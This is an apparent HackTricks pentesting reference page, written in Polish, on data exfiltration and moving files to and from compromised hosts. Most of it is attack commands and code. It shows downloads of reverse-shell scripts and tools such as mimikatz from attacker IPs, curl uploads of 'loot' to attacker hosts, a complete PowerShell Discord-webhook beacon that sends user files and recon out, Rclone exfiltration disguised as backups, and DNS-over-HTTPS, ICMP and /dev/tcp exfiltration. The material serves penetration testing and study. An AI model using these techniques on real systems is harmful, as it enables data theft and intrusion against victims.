# Eksfiltracja

{{#include ../banners/hacktricks-training.md}}

> [!TIP]
> Aby zapoznać się z przykładem kompleksowego procesu umieszczania loot w `C:\Users\Public` i eksfiltracji go za pomocą Rclone w celu naśladowania legalnych kopii zapasowych, przejrzyj poniższy workflow.

{{#ref}}
../windows-hardening/windows-local-privilege-escalation/dll-hijacking/advanced-html-staged-dll-sideloading.md
{{#endref}}

## Często umieszczane na białej liście domeny do eksfiltracji informacji

Sprawdź [https://lots-project.com/](https://lots-project.com/), aby znaleźć często umieszczane na białej liście domeny, które można wykorzystać.

## Kopiowanie i wklejanie Base64

**Linux**

```bash
base64 -w0 <file> #Encode file
base64 -d file #Decode file
```

**Windows**

```
certutil -encode payload.dll payload.b64
certutil -decode payload.b64 payload.dll
```

## HTTP

**Linux**

```bash
wget 10.10.14.14:8000/tcp_pty_backconnect.py -O /dev/shm/.rev.py
wget 10.10.14.14:8000/tcp_pty_backconnect.py -P /dev/shm
curl 10.10.14.14:8000/shell.py -o /dev/shm/shell.py
fetch 10.10.14.14:8000/shell.py #FreeBSD
```

**Windows**

```bash
certutil -urlcache -split -f http://webserver/payload.b64 payload.b64
bitsadmin /transfer transfName /priority high http://example.com/examplefile.pdf C:\downloads\examplefile.pdf

#PS
(New-Object Net.WebClient).DownloadFile("http://10.10.14.2:80/taskkill.exe","C:\Windows\Temp\taskkill.exe")
Invoke-WebRequest "http://10.10.14.2:80/taskkill.exe" -OutFile "taskkill.exe"
wget "http://10.10.14.2/nc.bat.exe" -OutFile "C:\ProgramData\unifivideo\taskkill.exe"

Import-Module BitsTransfer
Start-BitsTransfer -Source $url -Destination $output
#OR
Start-BitsTransfer -Source $url -Destination $output -Asynchronous
```

### Przesyłanie plików

- [**SimpleHttpServerWithFileUploads**](https://gist.github.com/UniIsland/3346170)
- [**SimpleHttpServer wyświetlający GET i POST (również nagłówki)**](https://gist.github.com/carlospolop/209ad4ed0e06dd3ad099e2fd0ed73149)
- Moduł Python [uploadserver](https://pypi.org/project/uploadserver/):

```bash
# Listen to files
python3 -m pip install --user uploadserver
python3 -m uploadserver
# With basic auth:
# python3 -m uploadserver --basic-auth hello:world

# Send a file
curl -X POST http://HOST/upload -H -F 'files=@file.txt'
# With basic auth:
# curl -X POST http://HOST/upload -H -F 'files=@file.txt' -u hello:world
```

### **Serwer HTTPS**

```python
# from https://gist.github.com/dergachev/7028596
# taken from http://www.piware.de/2011/01/creating-an-https-server-in-python/
# generate server.xml with the following command:
#    openssl req -new -x509 -keyout server.pem -out server.pem -days 365 -nodes
# run as follows:
#    python simple-https-server.py
# then in your browser, visit:
#    https://localhost:443

### PYTHON 2
import BaseHTTPServer, SimpleHTTPServer
import ssl

httpd = BaseHTTPServer.HTTPServer(('0.0.0.0', 443), SimpleHTTPServer.SimpleHTTPRequestHandler)
httpd.socket = ssl.wrap_socket (httpd.socket, certfile='./server.pem', server_side=True)
httpd.serve_forever()
###

### PYTHON3
from http.server import HTTPServer, BaseHTTPRequestHandler
import ssl

httpd = HTTPServer(('0.0.0.0', 443), BaseHTTPRequestHandler)
httpd.socket = ssl.wrap_socket(httpd.socket, certfile="./server.pem", server_side=True)
httpd.serve_forever()
###

### USING FLASK
from flask import Flask, redirect, request
from urllib.parse import quote
app = Flask(__name__)
@app.route('/')
def root():
    print(request.get_json())
    return "OK"
if __name__ == "__main__":
    app.run(ssl_context='adhoc', debug=True, host="0.0.0.0", port=8443)
###
```

### HTTP/3 / QUIC

Jeśli kontrola ruchu wychodzącego jest skonfigurowana pod kątem inspekcji klasycznego **TCP/443**, ale dopuszcza ruch **UDP/443**, wymuszenie **HTTP/3** może przenieść transfer do **QUIC** zamiast TLS-over-TCP. Endpoint atakującego musi natywnie obsługiwać HTTP/3 (na przykład przez reverse proxy lub endpoint do przesyłania plików, który już reklamuje `Alt-Svc: h3`).

```bash
# Strict: fail if QUIC/H3 is not available
curl --http3-only -T loot.7z https://attacker-h3.example/upload

# Opportunistic: prefer H3, but fall back to h2/h1 if QUIC fails
curl --http3 -T loot.7z https://attacker-h3.example/upload

# Learn the server's Alt-Svc advertisement and reuse it
curl --alt-svc /tmp/altsvc.cache https://attacker-h3.example/
curl --alt-svc /tmp/altsvc.cache -T loot.7z https://attacker-h3.example/upload
```

Badanie z 2025 r. (QUIC-Exfil) wykazało, że szyfrowane nagłówki QUIC i dynamiczne zmiany adresów mogą utrudniać wykrywanie eksfiltracji na poziomie zapory sieciowej bardziej niż w przypadku kanałów opartych na TLS lub DNS. Zademonstrowano też metodę wykorzystującą preferowany przez serwer adres, która maskuje eksfiltrację jako migrację połączenia po stronie serwera.<sup>[[9]](#references)</sup>

### Wysyłanie obiektów do magazynu z użyciem pre-signed URL / delegowanych uprawnień

Jeśli możesz wygenerować lub uzyskać krótkotrwały **signed URL**, ofiara potrzebuje jedynie standardowego klienta HTTPS. Dzięki temu nie trzeba instalować na hoście cloud SDK ani używać długotrwałych poświadczeń.<sup>[[8]](#references)</sup> Taki ruch może też wtapiać się w typowy ruch związany z magazynami obiektów.

**Linux / macOS (AWS S3 pre-signed `PUT`)**

```bash
curl -X PUT -T loot.7z \
  -H 'Content-Type: application/octet-stream' \
  'https://bucket.s3.amazonaws.com/case123/loot.7z?<presigned-query>'
```

**Windows PowerShell (AWS S3 pre-signed `PUT`)**

```powershell
Invoke-WebRequest -Method Put -InFile .\loot.7z `
  -ContentType 'application/octet-stream' `
  -Uri $presignedUrl
```

**Azure Blob SAS URL**

```bash
curl -X PUT --data-binary @loot.7z \
  -H 'x-ms-blob-type: BlockBlob' \
  -H 'Content-Type: application/octet-stream' \
  'https://acct.blob.core.windows.net/container/loot.7z?<sas>'
```

Notes:
- Pre-signed URLs / SAS tokens zwykle ograniczają **ścieżkę**, **metodę HTTP** i **czas wygaśnięcia**.<sup>[[8]](#references)[[10]](#references)</sup>
- W przypadku Azure Blob `Put Blob` nagłówek `x-ms-blob-type: BlockBlob` jest wymagany.<sup>[[10]](#references)</sup>
- Ten wzorzec dobrze sprawdza się z `curl`, `Invoke-WebRequest` lub dowolnym niestandardowym implantem, który może wysłać surowe żądanie HTTPS `PUT`.

### goshs

[goshs](https://github.com/patrickhener/goshs) to jednoplikowy zamiennik `python3 -m http.server`.<sup>[[4]](#references)</sup>
Obsługuje upload, download, WebDAV, SFTP, SMB, TLS, uwierzytelnianie, linki do udostępniania i funkcje współpracy OOB (DNS, SMTP, przechwytywanie hashy NTLM).<sup>[[4]](#references)</sup>

```bash
# Serve current directory on port 8000
goshs

# Serve with HTTPS (self-signed)
goshs -s -ss

# Serve with basic auth
goshs -b user:password

# Upload-only mode
goshs -uo

# Read-only mode
goshs -ro

# Capture SMB NTLM hashes
goshs -smb -smb-domain CORP

# DNS callback server
goshs -dns -dns-ip 10.10.10.10

# SMTP callback server
goshs -smtp -smtp-domain [REDACTED]

# Tunnel via localhost.run (no port forwarding needed)
goshs -tunnel
```

## Webhooks (Discord/Slack/Teams) do C2 i eksfiltracji danych

Webhooki to zapisywalne tylko przez HTTPS endpointy, które przyjmują JSON i opcjonalne części z plikami. Często są dozwolone w zaufanych domenach SaaS i nie wymagają OAuth ani kluczy API, dzięki czemu nadają się do beaconingu i eksfiltracji przy niewielkich utrudnieniach.<sup>[[5]](#references)[[6]](#references)</sup>

Najważniejsze informacje:
- Endpoint: Discord używa https://discord.com/api/webhooks/<id>/<token>
- Wykonaj POST z multipart/form-data, zawierający część o nazwie payload_json z wartością {"content":"..."} oraz opcjonalne części z plikami o nazwie file.
- Schemat pętli operatora: okresowy beacon -> rekonesans katalogów -> ukierunkowana eksfiltracja plików -> zrzut danych z rekonesansu -> uśpienie. Odpowiedź HTTP 204 NoContent/200 OK potwierdza dostarczenie.

PoC w PowerShell (Discord):

```powershell
# 1) Configure webhook and optional target file
$webhook = "https://discord.com/api/webhooks/YOUR_WEBHOOK_HERE"
$target  = Join-Path $env:USERPROFILE "Documents\SENSITIVE_FILE.bin"

# 2) Reuse a single HttpClient
$client = [System.Net.Http.HttpClient]::new()

function Send-DiscordText {
    param([string]$Text)
    $payload = @{ content = $Text } | ConvertTo-Json -Compress
    $jsonContent = New-Object System.Net.Http.StringContent($payload, [System.Text.Encoding]::UTF8, "application/json")
    $mp = New-Object System.Net.Http.MultipartFormDataContent
    $mp.Add($jsonContent, "payload_json")
    $resp = $client.PostAsync($webhook, $mp).Result
    Write-Host "[Discord] text -> $($resp.StatusCode)"
}

function Send-DiscordFile {
    param([string]$Path, [string]$Name)
    if (-not (Test-Path $Path)) { return }
    $bytes = [System.IO.File]::ReadAllBytes($Path)
    $fileContent = New-Object System.Net.Http.ByteArrayContent(,$bytes)
    $fileContent.Headers.ContentType = [System.Net.Http.Headers.MediaTypeHeaderValue]::Parse("application/octet-stream")
    $json = @{ content = ":package: file exfil: $Name" } | ConvertTo-Json -Compress
    $jsonContent = New-Object System.Net.Http.StringContent($json, [System.Text.Encoding]::UTF8, "application/json")
    $mp = New-Object System.Net.Http.MultipartFormDataContent
    $mp.Add($jsonContent, "payload_json")
    $mp.Add($fileContent, "file", $Name)
    $resp = $client.PostAsync($webhook, $mp).Result
    Write-Host "[Discord] file $Name -> $($resp.StatusCode)"
}

# 3) Beacon/recon/exfil loop
$ctr = 0
while ($true) {
    $ctr++
    # Beacon
    $beacon = "━━━━━━━━━━━━━━━━━━`n:satellite: Beacon`n```User: $env:USERNAME`nHost: $env:COMPUTERNAME```"
    Send-DiscordText -Text $beacon

    # Every 2nd: quick folder listing
    if ($ctr % 2 -eq 0) {
        $dirs = @("Documents","Desktop","Downloads","Pictures")
        $acc = foreach ($d in $dirs) {
            $p = Join-Path $env:USERPROFILE $d
            $items = Get-ChildItem -Path $p -ErrorAction SilentlyContinue | Select-Object -First 3 -ExpandProperty Name
            if ($items) { "`n$d:`n - " + ($items -join "`n - ") }
        }
        Send-DiscordText -Text (":file_folder: **User Dirs**`n━━━━━━━━━━━━━━━━━━`n```" + ($acc -join "") + "```")
    }

    # Every 3rd: targeted exfil
    if ($ctr % 3 -eq 0) { Send-DiscordFile -Path $target -Name ([IO.Path]::GetFileName($target)) }

    # Every 4th: basic recon
    if ($ctr % 4 -eq 0) {
        $who = whoami
        $ip  = ipconfig | Out-String
        $tmp = Join-Path $env:TEMP "recon.txt"
        "whoami:: $who`r`nIPConfig::`r`n$ip" | Out-File -FilePath $tmp -Encoding utf8
        Send-DiscordFile -Path $tmp -Name "recon.txt"
    }

    Start-Sleep -Seconds 20
}
```

Uwagi:
- Podobne wzorce dotyczą innych platform do współpracy (Slack/Teams) korzystających z incoming webhooks; odpowiednio dostosuj URL i schemat JSON.
- Informacje o analizie kryminalistycznej artefaktów cache Discord Desktop oraz odzyskiwaniu danych z webhooków/API znajdziesz na powiązanej stronie poniżej.<sup>[[7]](#references)</sup>

{{#ref}}
../generic-methodologies-and-resources/basic-forensic-methodology/specific-software-file-type-tricks/discord-cache-forensics.md
{{#endref}}

## Rclone (eksfiltracja do chmury/magazynu obiektowego)

Współcześni operatorzy często **lokalnie przygotowują loot**, a następnie używają [Rclone](https://rclone.org/), aby transfer wyglądał jak zwykłe zadanie tworzenia kopii zapasowej lub synchronizacji. Praktyczny wzorzec obejmuje:

1. Zwykły remote (`s3`, `webdav`, `drive`, `mega`, ...)
2. Wrapper `crypt`, dzięki któremu **zawartość i nazwy plików są szyfrowane po stronie klienta**
3. Opcjonalny wrapper `chunker`, jeśli dostawca narzuca limity rozmiaru obiektów lub chcesz używać mniejszych jednostek przesyłania 񟿿

```bash
# 1) Create the storage backend remote (interactive)
rclone config              # ex: remote

# 2) Wrap it with client-side encryption
rclone config              # ex: secret -> remote:path

# 3) Optional: create a chunker overlay for large objects
rclone config              # ex: overlay -> secret:

# 4) Upload staged data
rclone copy /loot secret:$(hostname)-$(date +%F) \
  --transfers 2 --checkers 2 --bwlimit 4M
# If you created the chunker wrapper, upload to overlay:... instead
```

Uwagi:
- `crypt` może szyfrować zarówno zawartość plików, jak i ich nazwy.<sup>[[3]](#references)</sup>
- `chunker` w sposób przezroczysty dzieli duże pliki i składa je ponownie podczas pobierania.<sup>[[11]](#references)</sup>
- `rclone.conf` przechowuje sekrety `crypt` w **zaciemnionej** formie, która nie zapewnia silnej ochrony danych w spoczynku.<sup>[[3]](#references)</sup> W przypadku krótkotrwałych operacji używaj dedykowanego tymczasowego pliku konfiguracyjnego i usuń go po zakończeniu. Jeśli musisz przechowywać go dłużej, wybierz szyfrowaną obsługę konfiguracji (`RCLONE_CONFIG_PASS` / `--password-command`), zamiast pozostawiać na dysku zwykły plik `rclone.conf`.<sup>[[11]](#references)</sup>
- Jeśli cel synchronizuje już **OneDrive**, **Google Drive** lub **Dropbox**, skopiowanie loot do synchronizowanego katalogu może wykorzystać już zatwierdzonego klienta, zamiast instalować nowy plik binarny do transferu.

{{#ref}}
../generic-methodologies-and-resources/basic-forensic-methodology/specific-software-file-type-tricks/local-cloud-storage.md
{{#endref}}

## FTP

### Serwer FTP (python)

```bash
pip3 install pyftpdlib
python3 -m pyftpdlib -p 21
```

### Serwer FTP (NodeJS)

```
sudo npm install -g ftp-srv --save
ftp-srv ftp://0.0.0.0:9876 --root /tmp
```

### Serwer FTP (pure-ftp)

```bash
apt-get update && apt-get install pure-ftp
```

```bash
#Run the following script to configure the FTP server
#!/bin/bash
groupadd ftpgroup
useradd -g ftpgroup -d /dev/null -s /etc ftpuser
pure-pwd useradd fusr -u ftpuser -d /ftphome
pure-pw mkdb
cd /etc/pure-ftpd/auth/
ln -s ../conf/PureDB 60pdb
mkdir -p /ftphome
chown -R ftpuser:ftpgroup /ftphome/
/etc/init.d/pure-ftpd restart
```

### **Windows** klient

```bash
#Work well with python. With pure-ftp use fusr:ftp
echo open 10.11.0.41 21 > ftp.txt
echo USER anonymous >> ftp.txt
echo anonymous >> ftp.txt
echo bin >> ftp.txt
echo GET mimikatz.exe >> ftp.txt
echo bye >> ftp.txt
ftp -n -v -s:ftp.txt
```

## SMB

Kali jako serwer

```bash
kali_op1> impacket-smbserver -smb2support kali `pwd` # Share current directory
kali_op2> smbserver.py -smb2support name /path/folder # Share a folder
#For new Win10 versions
impacket-smbserver -smb2support -user test -password test test `pwd`
```

Lub utwórz udział SMB **za pomocą Samba**:

```bash
apt-get install samba
mkdir /tmp/smb
chmod 777 /tmp/smb
#Add to the end of /etc/samba/smb.conf this:
[public]
    comment = Samba on Ubuntu
    path = /tmp/smb
    read only = no
    browsable = yes
    guest ok = Yes
#Start samba
service smbd restart
```

Windows

```bash
CMD-Wind> \\10.10.14.14\path\to\exe
CMD-Wind> net use z: \\10.10.14.14\test /user:test test #For SMB using credentials

WindPS-1> New-PSDrive -Name "new_disk" -PSProvider "FileSystem" -Root "\\10.10.14.9\kali"
WindPS-2> cd new_disk:
```

### goshs
[goshs](https://github.com/patrickhener/goshs) to alternatywa w postaci pojedynczego pliku binarnego, która udostępnia pliki przez SMB i przechwytuje hashe NTLM od łączących się klientów.<sup>[[4]](#references)</sup>

```bash
# Start SMB server with NTLM hash capture
goshs -smb -smb-domain CORP

# Also works for plain HTTP file serving
goshs
```

## SCP

Atakujący musi mieć uruchomiony SSHd.

```bash
scp <username>@<Attacker_IP>:<directory>/<filename>
```

## SSHFS

Jeśli ofiara ma SSH, atakujący może zamontować katalog ofiary na swoim komputerze.

```bash
sudo apt-get install sshfs
sudo mkdir /mnt/sshfs
sudo sshfs -o allow_other,default_permissions <Target username>@<Target IP address>:<Full path to folder>/ /mnt/sshfs/
```

## NC

```bash
nc -lvnp 4444 > new_file
nc -vn <IP> 4444 < exfil_file
```

## /dev/tcp

### Pobieranie pliku z ofiary

```bash
nc -lvnp 80 > file #Inside attacker
cat /path/file > /dev/tcp/10.10.10.10/80 #Inside victim
```

### Prześlij plik do ofiary

```bash
nc -w5 -lvnp 80 < file_to_send.txt # Inside attacker
# Inside victim
exec 6< /dev/tcp/10.10.10.10/4444
cat <&6 > file.txt
```

dzięki **@BinaryShadow\_**

## **ICMP**

```bash
# To exfiltrate the content of a file via pings you can do:
xxd -p -c 4 /path/file/exfil | while read line; do ping -c 1 -p $line <IP attacker>; done
#This will 4bytes per ping packet (you could probably increase this until 16)
```

```python
from scapy.all import *
#This is ippsec receiver created in the HTB machine Mischief
def process_packet(pkt):
    if pkt.haslayer(ICMP):
        if pkt[ICMP].type == 0:
            data = pkt[ICMP].load[-4:] #Read the 4bytes interesting
            print(f"{data.decode('utf-8')}", flush=True, end="")

sniff(iface="tun0", prn=process_packet)
```

## DNS over HTTPS (DoH)

Jeśli klasyczny DNS przez UDP/53 generuje dużo ruchu lub jest blokowany, ale wychodzący ruch HTTPS jest zasadniczo dozwolony, typowy wzorzec eksfiltracji w etykietach DNS można opakować w żądania **DoH** kierowane do publicznego resolvera. Każda etykieta powinna być znacznie krótsza niż limit DNS wynoszący 63 bajty. Używaj też alfabetu bezpiecznego dla DNS, takiego jak Base32.

```bash
# Encode -> split into DNS-safe labels -> send via DoH
base32 -w0 /tmp/loot.bin | tr -d '=' | tr 'A-Z' 'a-z' | fold -w32 | \
  nl -nrz -w4 -s. | while read chunk; do
    curl --http2 -s \
      -H 'accept: application/dns-json' \
      "https://dns.google/resolve?name=${chunk}.exf.attacker.tld&type=TXT" \
      >/dev/null
  done
```

Na autorytatywnym serwerze DNS dla `exf.attacker.tld` posortuj zapytania według prefiksu liczbowego i odtwórz strumień Base32. Dzięki temu transmisja odbywa się przez HTTPS do resolvera, a nie przez klasyczny DNS UDP/53.<sup>[[2]](#references)</sup>

Informacje o narzędziach do pełnego, dwukierunkowego tunelowania DNS (`iodine`, `dnscat2` itd.) znajdziesz na [stronie o tunelowaniu](tunneling-and-port-forwarding.md).

## **SMTP**

Jeśli możesz wysyłać dane do serwera SMTP, możesz skonfigurować serwer SMTP do ich odbierania za pomocą Pythona:

```bash
sudo python -m smtpd -n -c DebuggingServer :25
```

### goshs

[goshs](https://github.com/patrickhener/goshs) może szybko uruchomić serwer SMTP do przechwytywania callbacków e-mail w scenariuszach eksfiltracji OOB.<sup>[[4]](#references)</sup>

```bash
# Start SMTP callback server
goshs -smtp -smtp-domain [REDACTED]
```

Otrzymane wiadomości e-mail i callbacki są wyświetlane bezpośrednio w wynikach terminala.
Można połączyć z serwerem callbacków DNS, aby uzyskać pełne pokrycie OOB:

```bash
# DNS + SMTP combined
goshs -dns -dns-ip 10.10.10.10 -smtp -smtp-domain [REDACTED]
```

## TFTP

Domyślnie w XP i 2003 (w pozostałych systemach trzeba go jawnie dodać podczas instalacji)

W Kali **uruchom serwer TFTP**:

```bash
#I didn't get this options working and I prefer the python option
mkdir /tftp
atftpd --daemon --port 69 /tftp
cp /path/tp/nc.exe /tftp
```

**Serwer TFTP w Pythonie:**

```bash
pip install ptftpd
ptftpd -p 69 tap0 . # ptftp -p <PORT> <IFACE> <FOLDER>
```

Na **victim** połącz się z serwerem Kali:

```bash
tftp -i <KALI-IP> get nc.exe
```

## PHP

Pobierz plik za pomocą jednolinijkowego skryptu PHP:

```bash
echo "<?php file_put_contents('nameOfFile', fopen('http://192.168.1.102/file', 'r')); ?>" > down2.php
```

## VBScript

```bash
Attacker> python -m SimpleHTTPServer 80
```

**Ofiara**

```bash
echo strUrl = WScript.Arguments.Item(0) > wget.vbs
echo StrFile = WScript.Arguments.Item(1) >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_DEFAULT = 0 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_PRECONFIG = 0 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_DIRECT = 1 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_PROXY = 2 >> wget.vbs
echo Dim http, varByteArray, strData, strBuffer, lngCounter, fs, ts >> wget.vbs
echo Err.Clear >> wget.vbs
echo Set http = Nothing >> wget.vbs
echo Set http = CreateObject("WinHttp.WinHttpRequest.5.1") >> wget.vbs
echo If http Is Nothing Then Set http = CreateObject("WinHttp.WinHttpRequest") >> wget.vbs
echo If http Is Nothing Then Set http =CreateObject("MSXML2.ServerXMLHTTP") >> wget.vbs
echo If http Is Nothing Then Set http = CreateObject("Microsoft.XMLHTTP") >> wget.vbs
echo http.Open "GET", strURL, False >> wget.vbs
echo http.Send >> wget.vbs
echo varByteArray = http.ResponseBody >> wget.vbs
echo Set http = Nothing >> wget.vbs
echo Set fs = CreateObject("Scripting.FileSystemObject") >> wget.vbs
echo Set ts = fs.CreateTextFile(StrFile, True) >> wget.vbs
echo strData = "" >> wget.vbs
echo strBuffer = "" >> wget.vbs
echo For lngCounter = 0 to UBound(varByteArray) >> wget.vbs
echo ts.Write Chr(255 And Ascb(Midb(varByteArray,lngCounter + 1, 1))) >> wget.vbs
echo Next >> wget.vbs
echo ts.Close >> wget.vbs
```

```bash
cscript wget.vbs http://10.11.0.5/evil.exe evil.exe
```

## Debug.exe

Program `debug.exe` nie tylko umożliwia inspekcję plików binarnych, ale także ma **możliwość odtwarzania ich z danych hex**. Oznacza to, że po podaniu danych hex pliku binarnego `debug.exe` może wygenerować ten plik. Należy jednak pamiętać, że debug.exe ma **ograniczenie: może tworzyć pliki o rozmiarze do 64 kb**.<sup>[[1]](#references)</sup>

```bash
# Reduce the size
upx -9 nc.exe
wine exe2bat.exe nc.exe nc.txt
```

Następnie skopiuj i wklej tekst do windows-shell, a zostanie utworzony plik o nazwie nc.exe.

## References

- [1] [Przesyłanie plików do systemu Windows](https://chryzsh.gitbooks.io/pentestbook/content/transfering_files_to_windows.html)
- [2] [Google Public DNS — DNS-over-HTTPS (DoH)](https://developers.google.com/speed/public-dns/docs/doh)
- [3] [Backend `crypt` w Rclone](https://rclone.org/crypt/)
- [4] [goshs](https://github.com/patrickhener/goshs)
- [5] [Discord jako C2 i pozostawione ślady w pamięci podręcznej](https://www.pentestpartners.com/security-blog/discord-as-a-c2-and-the-cached-evidence-left-behind/)
- [6] [Webhooki Discorda — wykonanie webhooka](https://discord.com/developers/docs/resources/webhook#execute-webhook)
- [7] [Discord Forensic Suite (parser pamięci podręcznej)](https://github.com/jwdfir/discord_cache_parser)
- [8] [Przesyłanie obiektów za pomocą pre-signed URL — Amazon S3](https://docs.aws.amazon.com/AmazonS3/latest/userguide/PresignedUrlUploadObject.html)
- [9] [QUIC-Exfil: Wykorzystanie funkcji Server Preferred Address protokołu QUIC do przeprowadzania ataków eksfiltracji danych](https://arxiv.org/abs/2505.05292)
- [10] [Put Blob (REST API) — Azure Storage](https://learn.microsoft.com/en-us/rest/api/storageservices/put-blob)
- [11] [Dokumentacja Rclone](https://rclone.org/docs/#configuration-encryption)
{{#include ../banners/hacktricks-training.md}}
